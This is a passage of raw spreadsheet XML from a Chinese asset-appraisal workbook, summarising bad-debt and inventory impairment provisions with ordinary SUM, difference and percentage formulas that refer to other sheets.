      <c r="AZ4" s="389" t="n"/>
      <c r="BA4" s="389" t="n"/>
      <c r="BB4" s="389" t="n"/>
      <c r="BC4" s="389" t="n"/>
      <c r="BD4" s="389" t="n"/>
      <c r="BE4" s="389" t="n"/>
      <c r="BF4" s="389" t="n"/>
    </row>
    <row r="5" ht="15" customHeight="1" s="415">
      <c r="A5" s="264" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="B5" s="264" t="inlineStr">
        <is>
          <t>编号</t>
        </is>
      </c>
      <c r="C5" s="82" t="inlineStr">
        <is>
          <t>科目名称</t>
        </is>
      </c>
      <c r="D5" s="626" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="E5" s="626" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="F5" s="626" t="inlineStr">
        <is>
          <t>增减值</t>
        </is>
      </c>
      <c r="G5" s="626" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="H5" s="626" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
      <c r="I5" s="387" t="n"/>
      <c r="J5" s="389" t="n"/>
      <c r="K5" s="389" t="n"/>
      <c r="L5" s="389" t="n"/>
      <c r="M5" s="389" t="n"/>
      <c r="N5" s="389" t="n"/>
      <c r="O5" s="389" t="n"/>
      <c r="P5" s="389" t="n"/>
      <c r="Q5" s="389" t="n"/>
      <c r="R5" s="389" t="n"/>
      <c r="S5" s="389" t="n"/>
      <c r="T5" s="389" t="n"/>
      <c r="U5" s="389" t="n"/>
      <c r="V5" s="389" t="n"/>
      <c r="W5" s="389" t="n"/>
      <c r="X5" s="389" t="n"/>
      <c r="Y5" s="389" t="n"/>
      <c r="Z5" s="389" t="n"/>
      <c r="AA5" s="389" t="n"/>
      <c r="AB5" s="389" t="n"/>
      <c r="AC5" s="389" t="n"/>
      <c r="AD5" s="389" t="n"/>
      <c r="AE5" s="389" t="n"/>
      <c r="AF5" s="389" t="n"/>
      <c r="AG5" s="389" t="n"/>
      <c r="AH5" s="389" t="n"/>
      <c r="AI5" s="389" t="n"/>
      <c r="AJ5" s="389" t="n"/>
      <c r="AK5" s="389" t="n"/>
      <c r="AL5" s="389" t="n"/>
      <c r="AM5" s="389" t="n"/>
      <c r="AN5" s="389" t="n"/>
      <c r="AO5" s="389" t="n"/>
      <c r="AP5" s="389" t="n"/>
      <c r="AQ5" s="389" t="n"/>
      <c r="AR5" s="389" t="n"/>
      <c r="AS5" s="389" t="n"/>
      <c r="AT5" s="389" t="n"/>
      <c r="AU5" s="389" t="n"/>
      <c r="AV5" s="389" t="n"/>
      <c r="AW5" s="389" t="n"/>
      <c r="AX5" s="389" t="n"/>
      <c r="AY5" s="389" t="n"/>
      <c r="AZ5" s="389" t="n"/>
      <c r="BA5" s="389" t="n"/>
      <c r="BB5" s="389" t="n"/>
      <c r="BC5" s="389" t="n"/>
      <c r="BD5" s="389" t="n"/>
      <c r="BE5" s="389" t="n"/>
      <c r="BF5" s="389" t="n"/>
    </row>
    <row r="6" ht="15" customHeight="1" s="415">
      <c r="A6" s="185" t="n"/>
      <c r="B6" s="185" t="inlineStr">
        <is>
          <t>坏账合计</t>
        </is>
      </c>
      <c r="C6" s="180" t="inlineStr">
        <is>
          <t>一、坏账准备合计</t>
        </is>
      </c>
      <c r="D6" s="627">
        <f>SUM(D7:D11)</f>
        <v/>
      </c>
      <c r="E6" s="627">
        <f>SUM(E7:E11)</f>
        <v/>
      </c>
      <c r="F6" s="627">
        <f>IF((E6-D6)=0,"",(E6-D6))</f>
        <v/>
      </c>
      <c r="G6" s="627">
        <f>IF(OR(D6=0,D6="",F6=""),"",F6/D6*100)</f>
        <v/>
      </c>
      <c r="H6" s="628" t="n"/>
      <c r="I6" s="389" t="n"/>
      <c r="J6" s="389" t="n"/>
      <c r="K6" s="389" t="n"/>
      <c r="L6" s="389" t="n"/>
      <c r="M6" s="389" t="n"/>
      <c r="N6" s="389" t="n"/>
      <c r="O6" s="389" t="n"/>
      <c r="P6" s="389" t="n"/>
      <c r="Q6" s="389" t="n"/>
      <c r="R6" s="389" t="n"/>
      <c r="S6" s="389" t="n"/>
      <c r="T6" s="389" t="n"/>
      <c r="U6" s="389" t="n"/>
      <c r="V6" s="389" t="n"/>
      <c r="W6" s="389" t="n"/>
      <c r="X6" s="389" t="n"/>
      <c r="Y6" s="389" t="n"/>
      <c r="Z6" s="389" t="n"/>
      <c r="AA6" s="389" t="n"/>
      <c r="AB6" s="389" t="n"/>
      <c r="AC6" s="389" t="n"/>
      <c r="AD6" s="389" t="n"/>
      <c r="AE6" s="389" t="n"/>
      <c r="AF6" s="389" t="n"/>
      <c r="AG6" s="389" t="n"/>
      <c r="AH6" s="389" t="n"/>
      <c r="AI6" s="389" t="n"/>
      <c r="AJ6" s="389" t="n"/>
      <c r="AK6" s="389" t="n"/>
      <c r="AL6" s="389" t="n"/>
      <c r="AM6" s="389" t="n"/>
      <c r="AN6" s="389" t="n"/>
      <c r="AO6" s="389" t="n"/>
      <c r="AP6" s="389" t="n"/>
      <c r="AQ6" s="389" t="n"/>
      <c r="AR6" s="389" t="n"/>
      <c r="AS6" s="389" t="n"/>
      <c r="AT6" s="389" t="n"/>
      <c r="AU6" s="389" t="n"/>
      <c r="AV6" s="389" t="n"/>
      <c r="AW6" s="389" t="n"/>
      <c r="AX6" s="389" t="n"/>
      <c r="AY6" s="389" t="n"/>
      <c r="AZ6" s="389" t="n"/>
      <c r="BA6" s="389" t="n"/>
      <c r="BB6" s="389" t="n"/>
      <c r="BC6" s="389" t="n"/>
      <c r="BD6" s="389" t="n"/>
      <c r="BE6" s="389" t="n"/>
      <c r="BF6" s="389" t="n"/>
    </row>
    <row r="7" ht="15" customHeight="1" s="415">
      <c r="A7" s="55" t="inlineStr">
        <is>
          <t>3-4</t>
        </is>
      </c>
      <c r="B7" s="185" t="inlineStr">
        <is>
          <t>应收票据</t>
        </is>
      </c>
      <c r="C7" s="180" t="inlineStr">
        <is>
          <t xml:space="preserve">    其中：应收票据</t>
        </is>
      </c>
      <c r="D7" s="629">
        <f>'3-4应收票据'!G27</f>
        <v/>
      </c>
      <c r="E7" s="629">
        <f>'3-4应收票据'!H27</f>
        <v/>
      </c>
      <c r="F7" s="627">
        <f>IF((E7-D7)=0,"",(E7-D7))</f>
        <v/>
      </c>
      <c r="G7" s="627">
        <f>IF(OR(D7=0,D7="",F7=""),"",F7/D7*100)</f>
        <v/>
      </c>
      <c r="H7" s="628" t="n"/>
      <c r="I7" s="389" t="n"/>
      <c r="J7" s="389" t="n"/>
      <c r="K7" s="389" t="n"/>
      <c r="L7" s="389" t="n"/>
      <c r="M7" s="389" t="n"/>
      <c r="N7" s="389" t="n"/>
      <c r="O7" s="389" t="n"/>
      <c r="P7" s="389" t="n"/>
      <c r="Q7" s="389" t="n"/>
      <c r="R7" s="389" t="n"/>
      <c r="S7" s="389" t="n"/>
      <c r="T7" s="389" t="n"/>
      <c r="U7" s="389" t="n"/>
      <c r="V7" s="389" t="n"/>
      <c r="W7" s="389" t="n"/>
      <c r="X7" s="389" t="n"/>
      <c r="Y7" s="389" t="n"/>
      <c r="Z7" s="389" t="n"/>
      <c r="AA7" s="389" t="n"/>
      <c r="AB7" s="389" t="n"/>
      <c r="AC7" s="389" t="n"/>
      <c r="AD7" s="389" t="n"/>
      <c r="AE7" s="389" t="n"/>
      <c r="AF7" s="389" t="n"/>
      <c r="AG7" s="389" t="n"/>
      <c r="AH7" s="389" t="n"/>
      <c r="AI7" s="389" t="n"/>
      <c r="AJ7" s="389" t="n"/>
      <c r="AK7" s="389" t="n"/>
      <c r="AL7" s="389" t="n"/>
      <c r="AM7" s="389" t="n"/>
      <c r="AN7" s="389" t="n"/>
      <c r="AO7" s="389" t="n"/>
      <c r="AP7" s="389" t="n"/>
      <c r="AQ7" s="389" t="n"/>
      <c r="AR7" s="389" t="n"/>
      <c r="AS7" s="389" t="n"/>
      <c r="AT7" s="389" t="n"/>
      <c r="AU7" s="389" t="n"/>
      <c r="AV7" s="389" t="n"/>
      <c r="AW7" s="389" t="n"/>
      <c r="AX7" s="389" t="n"/>
      <c r="AY7" s="389" t="n"/>
      <c r="AZ7" s="389" t="n"/>
      <c r="BA7" s="389" t="n"/>
      <c r="BB7" s="389" t="n"/>
      <c r="BC7" s="389" t="n"/>
      <c r="BD7" s="389" t="n"/>
      <c r="BE7" s="389" t="n"/>
      <c r="BF7" s="389" t="n"/>
    </row>
    <row r="8" ht="15" customHeight="1" s="415">
      <c r="A8" s="55" t="inlineStr">
        <is>
          <t>3-5</t>
        </is>
      </c>
      <c r="B8" s="185" t="inlineStr">
        <is>
          <t>应收账款</t>
        </is>
      </c>
      <c r="C8" s="180" t="inlineStr">
        <is>
          <t xml:space="preserve">         应收账款</t>
        </is>
      </c>
      <c r="D8" s="629">
        <f>'3-5应收账款'!J27</f>
        <v/>
      </c>
      <c r="E8" s="629">
        <f>'3-5应收账款'!K27</f>
        <v/>
      </c>
      <c r="F8" s="627">
        <f>IF((E8-D8)=0,"",(E8-D8))</f>
        <v/>
      </c>
      <c r="G8" s="627">
        <f>IF(OR(D8=0,D8="",F8=""),"",F8/D8*100)</f>
        <v/>
      </c>
      <c r="H8" s="628" t="n"/>
      <c r="I8" s="630" t="n"/>
      <c r="J8" s="389" t="n"/>
      <c r="K8" s="389" t="n"/>
      <c r="L8" s="389" t="n"/>
      <c r="M8" s="389" t="n"/>
      <c r="N8" s="389" t="n"/>
      <c r="O8" s="389" t="n"/>
      <c r="P8" s="389" t="n"/>
      <c r="Q8" s="389" t="n"/>
      <c r="R8" s="389" t="n"/>
      <c r="S8" s="389" t="n"/>
      <c r="T8" s="389" t="n"/>
      <c r="U8" s="389" t="n"/>
      <c r="V8" s="389" t="n"/>
      <c r="W8" s="389" t="n"/>
      <c r="X8" s="389" t="n"/>
      <c r="Y8" s="389" t="n"/>
      <c r="Z8" s="389" t="n"/>
      <c r="AA8" s="389" t="n"/>
      <c r="AB8" s="389" t="n"/>
      <c r="AC8" s="389" t="n"/>
      <c r="AD8" s="389" t="n"/>
      <c r="AE8" s="389" t="n"/>
      <c r="AF8" s="389" t="n"/>
      <c r="AG8" s="389" t="n"/>
      <c r="AH8" s="389" t="n"/>
      <c r="AI8" s="389" t="n"/>
      <c r="AJ8" s="389" t="n"/>
      <c r="AK8" s="389" t="n"/>
      <c r="AL8" s="389" t="n"/>
      <c r="AM8" s="389" t="n"/>
      <c r="AN8" s="389" t="n"/>
      <c r="AO8" s="389" t="n"/>
      <c r="AP8" s="389" t="n"/>
      <c r="AQ8" s="389" t="n"/>
      <c r="AR8" s="389" t="n"/>
      <c r="AS8" s="389" t="n"/>
      <c r="AT8" s="389" t="n"/>
      <c r="AU8" s="389" t="n"/>
      <c r="AV8" s="389" t="n"/>
      <c r="AW8" s="389" t="n"/>
      <c r="AX8" s="389" t="n"/>
      <c r="AY8" s="389" t="n"/>
      <c r="AZ8" s="389" t="n"/>
      <c r="BA8" s="389" t="n"/>
      <c r="BB8" s="389" t="n"/>
      <c r="BC8" s="389" t="n"/>
      <c r="BD8" s="389" t="n"/>
      <c r="BE8" s="389" t="n"/>
      <c r="BF8" s="389" t="n"/>
    </row>
    <row r="9" ht="15" customHeight="1" s="415">
      <c r="A9" s="55" t="inlineStr">
        <is>
          <t>3-6</t>
        </is>
      </c>
      <c r="B9" s="185" t="inlineStr">
        <is>
          <t>应收款融</t>
        </is>
      </c>
      <c r="C9" s="180" t="inlineStr">
        <is>
          <t xml:space="preserve">         应收款项融资</t>
        </is>
      </c>
      <c r="D9" s="629">
        <f>'3-6应收款项融资'!J27</f>
        <v/>
      </c>
      <c r="E9" s="629">
        <f>'3-6应收款项融资'!K27</f>
        <v/>
      </c>
      <c r="F9" s="627">
        <f>IF((E9-D9)=0,"",(E9-D9))</f>
        <v/>
      </c>
      <c r="G9" s="627">
        <f>IF(OR(D9=0,D9="",F9=""),"",F9/D9*100)</f>
        <v/>
      </c>
      <c r="H9" s="628" t="n"/>
      <c r="I9" s="630" t="n"/>
      <c r="J9" s="389" t="n"/>
      <c r="K9" s="389" t="n"/>
      <c r="L9" s="389" t="n"/>
      <c r="M9" s="389" t="n"/>
      <c r="N9" s="389" t="n"/>
      <c r="O9" s="389" t="n"/>
      <c r="P9" s="389" t="n"/>
      <c r="Q9" s="389" t="n"/>
      <c r="R9" s="389" t="n"/>
      <c r="S9" s="389" t="n"/>
      <c r="T9" s="389" t="n"/>
      <c r="U9" s="389" t="n"/>
      <c r="V9" s="389" t="n"/>
      <c r="W9" s="389" t="n"/>
      <c r="X9" s="389" t="n"/>
      <c r="Y9" s="389" t="n"/>
      <c r="Z9" s="389" t="n"/>
      <c r="AA9" s="389" t="n"/>
      <c r="AB9" s="389" t="n"/>
      <c r="AC9" s="389" t="n"/>
      <c r="AD9" s="389" t="n"/>
      <c r="AE9" s="389" t="n"/>
      <c r="AF9" s="389" t="n"/>
      <c r="AG9" s="389" t="n"/>
      <c r="AH9" s="389" t="n"/>
      <c r="AI9" s="389" t="n"/>
      <c r="AJ9" s="389" t="n"/>
      <c r="AK9" s="389" t="n"/>
      <c r="AL9" s="389" t="n"/>
      <c r="AM9" s="389" t="n"/>
      <c r="AN9" s="389" t="n"/>
      <c r="AO9" s="389" t="n"/>
      <c r="AP9" s="389" t="n"/>
      <c r="AQ9" s="389" t="n"/>
      <c r="AR9" s="389" t="n"/>
      <c r="AS9" s="389" t="n"/>
      <c r="AT9" s="389" t="n"/>
      <c r="AU9" s="389" t="n"/>
      <c r="AV9" s="389" t="n"/>
      <c r="AW9" s="389" t="n"/>
      <c r="AX9" s="389" t="n"/>
      <c r="AY9" s="389" t="n"/>
      <c r="AZ9" s="389" t="n"/>
      <c r="BA9" s="389" t="n"/>
      <c r="BB9" s="389" t="n"/>
      <c r="BC9" s="389" t="n"/>
      <c r="BD9" s="389" t="n"/>
      <c r="BE9" s="389" t="n"/>
      <c r="BF9" s="389" t="n"/>
    </row>
    <row r="10" ht="15" customHeight="1" s="415">
      <c r="A10" s="55" t="inlineStr">
        <is>
          <t>3-7</t>
        </is>
      </c>
      <c r="B10" s="185" t="inlineStr">
        <is>
          <t>预付账款</t>
        </is>
      </c>
      <c r="C10" s="180" t="inlineStr">
        <is>
          <t xml:space="preserve">         预付账款</t>
        </is>
      </c>
      <c r="D10" s="629">
        <f>'3-7预付款项'!J27</f>
        <v/>
      </c>
      <c r="E10" s="629">
        <f>'3-7预付款项'!K27</f>
        <v/>
      </c>
      <c r="F10" s="627">
        <f>IF((E10-D10)=0,"",(E10-D10))</f>
        <v/>
      </c>
      <c r="G10" s="627">
        <f>IF(OR(D10=0,D10="",F10=""),"",F10/D10*100)</f>
        <v/>
      </c>
      <c r="H10" s="628" t="n"/>
      <c r="I10" s="389" t="n"/>
      <c r="J10" s="389" t="n"/>
      <c r="K10" s="389" t="n"/>
      <c r="L10" s="389" t="n"/>
      <c r="M10" s="389" t="n"/>
      <c r="N10" s="389" t="n"/>
      <c r="O10" s="389" t="n"/>
      <c r="P10" s="389" t="n"/>
      <c r="Q10" s="389" t="n"/>
      <c r="R10" s="389" t="n"/>
      <c r="S10" s="389" t="n"/>
      <c r="T10" s="389" t="n"/>
      <c r="U10" s="389" t="n"/>
      <c r="V10" s="389" t="n"/>
      <c r="W10" s="389" t="n"/>
      <c r="X10" s="389" t="n"/>
      <c r="Y10" s="389" t="n"/>
      <c r="Z10" s="389" t="n"/>
      <c r="AA10" s="389" t="n"/>
      <c r="AB10" s="389" t="n"/>
      <c r="AC10" s="389" t="n"/>
      <c r="AD10" s="389" t="n"/>
      <c r="AE10" s="389" t="n"/>
      <c r="AF10" s="389" t="n"/>
      <c r="AG10" s="389" t="n"/>
      <c r="AH10" s="389" t="n"/>
      <c r="AI10" s="389" t="n"/>
      <c r="AJ10" s="389" t="n"/>
      <c r="AK10" s="389" t="n"/>
      <c r="AL10" s="389" t="n"/>
      <c r="AM10" s="389" t="n"/>
      <c r="AN10" s="389" t="n"/>
      <c r="AO10" s="389" t="n"/>
      <c r="AP10" s="389" t="n"/>
      <c r="AQ10" s="389" t="n"/>
      <c r="AR10" s="389" t="n"/>
      <c r="AS10" s="389" t="n"/>
      <c r="AT10" s="389" t="n"/>
      <c r="AU10" s="389" t="n"/>
      <c r="AV10" s="389" t="n"/>
      <c r="AW10" s="389" t="n"/>
      <c r="AX10" s="389" t="n"/>
      <c r="AY10" s="389" t="n"/>
      <c r="AZ10" s="389" t="n"/>
      <c r="BA10" s="389" t="n"/>
      <c r="BB10" s="389" t="n"/>
      <c r="BC10" s="389" t="n"/>
      <c r="BD10" s="389" t="n"/>
      <c r="BE10" s="389" t="n"/>
      <c r="BF10" s="389" t="n"/>
    </row>
    <row r="11" ht="15" customHeight="1" s="415">
      <c r="A11" s="55" t="inlineStr">
        <is>
          <t>3-8</t>
        </is>
      </c>
      <c r="B11" s="185" t="inlineStr">
        <is>
          <t>其他应收</t>
        </is>
      </c>
      <c r="C11" s="180" t="inlineStr">
        <is>
          <t xml:space="preserve">         其他应收款</t>
        </is>
      </c>
      <c r="D11" s="629">
        <f>'3-8-3其他应收款'!J28</f>
        <v/>
      </c>
      <c r="E11" s="629">
        <f>'3-8-3其他应收款'!K28</f>
        <v/>
      </c>
      <c r="F11" s="627">
        <f>IF((E11-D11)=0,"",(E11-D11))</f>
        <v/>
      </c>
      <c r="G11" s="627">
        <f>IF(OR(D11=0,D11="",F11=""),"",F11/D11*100)</f>
        <v/>
      </c>
      <c r="H11" s="628" t="n"/>
      <c r="I11" s="389" t="n"/>
      <c r="J11" s="389" t="n"/>
      <c r="K11" s="389" t="n"/>
      <c r="L11" s="389" t="n"/>
      <c r="M11" s="389" t="n"/>
      <c r="N11" s="389" t="n"/>
      <c r="O11" s="389" t="n"/>
      <c r="P11" s="389" t="n"/>
      <c r="Q11" s="389" t="n"/>
      <c r="R11" s="389" t="n"/>
      <c r="S11" s="389" t="n"/>
      <c r="T11" s="389" t="n"/>
      <c r="U11" s="389" t="n"/>
      <c r="V11" s="389" t="n"/>
      <c r="W11" s="389" t="n"/>
      <c r="X11" s="389" t="n"/>
      <c r="Y11" s="389" t="n"/>
      <c r="Z11" s="389" t="n"/>
      <c r="AA11" s="389" t="n"/>
      <c r="AB11" s="389" t="n"/>
      <c r="AC11" s="389" t="n"/>
      <c r="AD11" s="389" t="n"/>
      <c r="AE11" s="389" t="n"/>
      <c r="AF11" s="389" t="n"/>
      <c r="AG11" s="389" t="n"/>
      <c r="AH11" s="389" t="n"/>
      <c r="AI11" s="389" t="n"/>
      <c r="AJ11" s="389" t="n"/>
      <c r="AK11" s="389" t="n"/>
      <c r="AL11" s="389" t="n"/>
      <c r="AM11" s="389" t="n"/>
      <c r="AN11" s="389" t="n"/>
      <c r="AO11" s="389" t="n"/>
      <c r="AP11" s="389" t="n"/>
      <c r="AQ11" s="389" t="n"/>
      <c r="AR11" s="389" t="n"/>
      <c r="AS11" s="389" t="n"/>
      <c r="AT11" s="389" t="n"/>
      <c r="AU11" s="389" t="n"/>
      <c r="AV11" s="389" t="n"/>
      <c r="AW11" s="389" t="n"/>
      <c r="AX11" s="389" t="n"/>
      <c r="AY11" s="389" t="n"/>
      <c r="AZ11" s="389" t="n"/>
      <c r="BA11" s="389" t="n"/>
      <c r="BB11" s="389" t="n"/>
      <c r="BC11" s="389" t="n"/>
      <c r="BD11" s="389" t="n"/>
      <c r="BE11" s="389" t="n"/>
      <c r="BF11" s="389" t="n"/>
    </row>
    <row r="12" ht="15" customHeight="1" s="415">
      <c r="A12" s="284" t="inlineStr">
        <is>
          <t>3-9-1</t>
        </is>
      </c>
      <c r="B12" s="185" t="inlineStr">
        <is>
          <t>存货汇总</t>
        </is>
      </c>
      <c r="C12" s="180" t="inlineStr">
        <is>
          <t>二、存货跌价准备合计</t>
        </is>
      </c>
      <c r="D12" s="629">
        <f>SUM(D13:D21)</f>
        <v/>
      </c>
      <c r="E12" s="629">
        <f>SUM(E13:E21)</f>
        <v/>
      </c>
      <c r="F12" s="627">
        <f>IF((E12-D12)=0,"",(E12-D12))</f>
        <v/>
      </c>
      <c r="G12" s="627">
        <f>IF(OR(D12=0,D12="",F12=""),"",F12/D12*100)</f>
        <v/>
      </c>
      <c r="H12" s="628" t="n"/>
      <c r="I12" s="389" t="n"/>
      <c r="J12" s="389" t="n"/>
      <c r="K12" s="389" t="n"/>
      <c r="L12" s="389" t="n"/>
      <c r="M12" s="389" t="n"/>
      <c r="N12" s="389" t="n"/>
      <c r="O12" s="389" t="n"/>
      <c r="P12" s="389" t="n"/>
      <c r="Q12" s="389" t="n"/>
      <c r="R12" s="389" t="n"/>
      <c r="S12" s="389" t="n"/>
      <c r="T12" s="389" t="n"/>
      <c r="U12" s="389" t="n"/>
      <c r="V12" s="389" t="n"/>
      <c r="W12" s="389" t="n"/>
      <c r="X12" s="389" t="n"/>
      <c r="Y12" s="389" t="n"/>
      <c r="Z12" s="389" t="n"/>
      <c r="AA12" s="389" t="n"/>
      <c r="AB12" s="389" t="n"/>
      <c r="AC12" s="389" t="n"/>
      <c r="AD12" s="389" t="n"/>
      <c r="AE12" s="389" t="n"/>
      <c r="AF12" s="389" t="n"/>
      <c r="AG12" s="389" t="n"/>
      <c r="AH12" s="389" t="n"/>
      <c r="AI12" s="389" t="n"/>
      <c r="AJ12" s="389" t="n"/>
      <c r="AK12" s="389" t="n"/>
      <c r="AL12" s="389" t="n"/>
      <c r="AM12" s="389" t="n"/>
      <c r="AN12" s="389" t="n"/>
      <c r="AO12" s="389" t="n"/>
      <c r="AP12" s="389" t="n"/>
      <c r="AQ12" s="389" t="n"/>
      <c r="AR12" s="389" t="n"/>
      <c r="AS12" s="389" t="n"/>
      <c r="AT12" s="389" t="n"/>
      <c r="AU12" s="389" t="n"/>
      <c r="AV12" s="389" t="n"/>
      <c r="AW12" s="389" t="n"/>
      <c r="AX12" s="389" t="n"/>
      <c r="AY12" s="389" t="n"/>
      <c r="AZ12" s="389" t="n"/>
      <c r="BA12" s="389" t="n"/>
      <c r="BB12" s="389" t="n"/>
      <c r="BC12" s="389" t="n"/>
      <c r="BD12" s="389" t="n"/>
      <c r="BE12" s="389" t="n"/>
      <c r="BF12" s="389" t="n"/>
    </row>
    <row r="13" ht="15" customHeight="1" s="415">
      <c r="A13" s="284" t="inlineStr">
        <is>
          <t>3-9-1</t>
        </is>
      </c>
      <c r="B13" s="91" t="inlineStr">
        <is>
          <t>跌价存货采购</t>
        </is>
      </c>
      <c r="C13" s="157" t="inlineStr">
        <is>
          <t>跌价准备-在途物资</t>
        </is>
      </c>
      <c r="D13" s="629">
        <f>'3-9-1在途物资'!G27</f>
        <v/>
      </c>
      <c r="E13" s="629" t="n"/>
      <c r="F13" s="627">
        <f>IF((E13-D13)=0,"",(E13-D13))</f>
        <v/>
      </c>
      <c r="G13" s="627">
        <f>IF(OR(D13=0,D13="",F13=""),"",F13/D13*100)</f>
        <v/>
      </c>
      <c r="H13" s="628" t="n"/>
      <c r="I13" s="389" t="n"/>
      <c r="J13" s="389" t="n"/>
      <c r="K13" s="389" t="n"/>
      <c r="L13" s="389" t="n"/>
      <c r="M13" s="389" t="n"/>
      <c r="N13" s="389" t="n"/>
      <c r="O13" s="389" t="n"/>
      <c r="P13" s="389" t="n"/>
      <c r="Q13" s="389" t="n"/>
      <c r="R13" s="389" t="n"/>
      <c r="S13" s="389" t="n"/>
      <c r="T13" s="389" t="n"/>
      <c r="U13" s="389" t="n"/>
      <c r="V13" s="389" t="n"/>
      <c r="W13" s="389" t="n"/>
      <c r="X13" s="389" t="n"/>
      <c r="Y13" s="389" t="n"/>
      <c r="Z13" s="389" t="n"/>
      <c r="AA13" s="389" t="n"/>
      <c r="AB13" s="389" t="n"/>
      <c r="AC13" s="389" t="n"/>
      <c r="AD13" s="389" t="n"/>
      <c r="AE13" s="389" t="n"/>
      <c r="AF13" s="389" t="n"/>
      <c r="AG13" s="389" t="n"/>
      <c r="AH13" s="389" t="n"/>
      <c r="AI13" s="389" t="n"/>
      <c r="AJ13" s="389" t="n"/>
      <c r="AK13" s="389" t="n"/>
      <c r="AL13" s="389" t="n"/>
      <c r="AM13" s="389" t="n"/>
      <c r="AN13" s="389" t="n"/>
      <c r="AO13" s="389" t="n"/>
      <c r="AP13" s="389" t="n"/>
      <c r="AQ13" s="389" t="n"/>
      <c r="AR13" s="389" t="n"/>
      <c r="AS13" s="389" t="n"/>
      <c r="AT13" s="389" t="n"/>
      <c r="AU13" s="389" t="n"/>
      <c r="AV13" s="389" t="n"/>
      <c r="AW13" s="389" t="n"/>
      <c r="AX13" s="389" t="n"/>
      <c r="AY13" s="389" t="n"/>
      <c r="AZ13" s="389" t="n"/>
      <c r="BA13" s="389" t="n"/>
      <c r="BB13" s="389" t="n"/>
      <c r="BC13" s="389" t="n"/>
      <c r="BD13" s="389" t="n"/>
      <c r="BE13" s="389" t="n"/>
      <c r="BF13" s="389" t="n"/>
    </row>
    <row r="14" ht="15" customHeight="1" s="415">
      <c r="A14" s="284" t="inlineStr">
        <is>
          <t>3-9-2</t>
        </is>
      </c>
      <c r="B14" s="397" t="inlineStr">
        <is>
          <t>跌价存货原材</t>
        </is>
      </c>
      <c r="C14" s="255" t="inlineStr">
        <is>
          <t>跌价准备-原材料</t>
        </is>
      </c>
      <c r="D14" s="629">
        <f>'3-9-2原材料'!H27</f>
        <v/>
      </c>
      <c r="E14" s="629" t="n"/>
      <c r="F14" s="627">
        <f>IF((E14-D14)=0,"",(E14-D14))</f>
        <v/>
      </c>
      <c r="G14" s="627">
        <f>IF(OR(D14=0,D14="",F14=""),"",F14/D14*100)</f>
        <v/>
      </c>
      <c r="H14" s="628" t="n"/>
      <c r="I14" s="389" t="n"/>
      <c r="J14" s="389" t="n"/>
      <c r="K14" s="389" t="n"/>
      <c r="L14" s="389" t="n"/>
      <c r="M14" s="389" t="n"/>
      <c r="N14" s="389" t="n"/>
      <c r="O14" s="389" t="n"/>
      <c r="P14" s="389" t="n"/>
      <c r="Q14" s="389" t="n"/>
      <c r="R14" s="389" t="n"/>
      <c r="S14" s="389" t="n"/>
      <c r="T14" s="389" t="n"/>
      <c r="U14" s="389" t="n"/>
      <c r="V14" s="389" t="n"/>
      <c r="W14" s="389" t="n"/>
      <c r="X14" s="389" t="n"/>
      <c r="Y14" s="389" t="n"/>
      <c r="Z14" s="389" t="n"/>
      <c r="AA14" s="389" t="n"/>
      <c r="AB14" s="389" t="n"/>
      <c r="AC14" s="389" t="n"/>
      <c r="AD14" s="389" t="n"/>
      <c r="AE14" s="389" t="n"/>
      <c r="AF14" s="389" t="n"/>
      <c r="AG14" s="389" t="n"/>
      <c r="AH14" s="389" t="n"/>
      <c r="AI14" s="389" t="n"/>
      <c r="AJ14" s="389" t="n"/>
      <c r="AK14" s="389" t="n"/>
      <c r="AL14" s="389" t="n"/>
      <c r="AM14" s="389" t="n"/>
      <c r="AN14" s="389" t="n"/>
      <c r="AO14" s="389" t="n"/>
      <c r="AP14" s="389" t="n"/>
      <c r="AQ14" s="389" t="n"/>
      <c r="AR14" s="389" t="n"/>
      <c r="AS14" s="389" t="n"/>
      <c r="AT14" s="389" t="n"/>
      <c r="AU14" s="389" t="n"/>
      <c r="AV14" s="389" t="n"/>
      <c r="AW14" s="389" t="n"/>
      <c r="AX14" s="389" t="n"/>
      <c r="AY14" s="389" t="n"/>
      <c r="AZ14" s="389" t="n"/>
      <c r="BA14" s="389" t="n"/>
      <c r="BB14" s="389" t="n"/>
      <c r="BC14" s="389" t="n"/>
      <c r="BD14" s="389" t="n"/>
      <c r="BE14" s="389" t="n"/>
      <c r="BF14" s="389" t="n"/>
    </row>
    <row r="15" ht="15" customHeight="1" s="415">
      <c r="A15" s="284" t="inlineStr">
        <is>
          <t>3-9-3</t>
        </is>
      </c>
      <c r="B15" s="397" t="inlineStr">
        <is>
          <t>跌价存货在库</t>
        </is>
      </c>
      <c r="C15" s="182" t="inlineStr">
        <is>
          <t>跌价准备-在库周转材料</t>
        </is>
      </c>
      <c r="D15" s="629">
        <f>'3-9-3在库周转材料'!H27</f>
        <v/>
      </c>
      <c r="E15" s="629" t="n"/>
      <c r="F15" s="627">
        <f>IF((E15-D15)=0,"",(E15-D15))</f>
        <v/>
      </c>
      <c r="G15" s="627">
        <f>IF(OR(D15=0,D15="",F15=""),"",F15/D15*100)</f>
        <v/>
      </c>
      <c r="H15" s="628" t="n"/>
      <c r="I15" s="389" t="n"/>
      <c r="J15" s="389" t="n"/>
      <c r="K15" s="389" t="n"/>
      <c r="L15" s="389" t="n"/>
      <c r="M15" s="389" t="n"/>
      <c r="N15" s="389" t="n"/>
      <c r="O15" s="389" t="n"/>
      <c r="P15" s="389" t="n"/>
      <c r="Q15" s="389" t="n"/>
      <c r="R15" s="389" t="n"/>
      <c r="S15" s="389" t="n"/>
      <c r="T15" s="389" t="n"/>
      <c r="U15" s="389" t="n"/>
      <c r="V15" s="389" t="n"/>
      <c r="W15" s="389" t="n"/>
      <c r="X15" s="389" t="n"/>
      <c r="Y15" s="389" t="n"/>
      <c r="Z15" s="389" t="n"/>
      <c r="AA15" s="389" t="n"/>
      <c r="AB15" s="389" t="n"/>
      <c r="AC15" s="389" t="n"/>
      <c r="AD15" s="389" t="n"/>
      <c r="AE15" s="389" t="n"/>
      <c r="AF15" s="389" t="n"/>
      <c r="AG15" s="389" t="n"/>
      <c r="AH15" s="389" t="n"/>
      <c r="AI15" s="389" t="n"/>
      <c r="AJ15" s="389" t="n"/>
      <c r="AK15" s="389" t="n"/>
      <c r="AL15" s="389" t="n"/>
      <c r="AM15" s="389" t="n"/>
      <c r="AN15" s="389" t="n"/>
